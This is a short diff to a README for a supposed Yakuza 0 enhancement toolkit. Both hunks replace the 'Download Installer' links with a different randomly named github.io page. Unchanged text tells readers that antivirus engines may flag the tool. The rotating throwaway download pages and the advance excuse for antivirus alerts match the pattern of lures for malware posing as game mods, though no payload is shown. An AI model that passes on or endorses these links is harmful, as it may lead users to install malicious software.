@@ -6,7 +6,7 @@ The **Yakuza 0 Enhancement Toolkit** is the definitive all-in-one utility for Ya
 
 ---
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
@@ -80,7 +80,7 @@ Some heuristic antivirus engines may flag memory-editing tools as potentially un
 
 Ready to enhance your Yakuza 0 experience? Grab the latest version here:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
